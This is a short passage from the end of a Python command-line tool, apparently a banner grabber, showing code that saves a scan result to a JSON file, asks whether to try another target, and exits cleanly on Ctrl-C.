            fn=f"fox_{host.replace('.','-')}_{port}.json"
            try:
                with open(fn,"w",encoding="utf-8") as f: json.dump(result,f,indent=2)
                print(f"{F.GREEN}{B}[+]{N} Saved banner → {F.CYAN}{fn}{N}")
            except Exception as e:
                print(f"{F.RED}[!] Save failed: {e}{N}")

        again=input(f"\n{B}Try another target? (y/N): {N}").strip().lower()
        if again!="y": break

if __name__=="__main__":
    try: main()
    except KeyboardInterrupt:
        print(f"\n{F.YELLOW}^C{N}"); sys.exit(0)
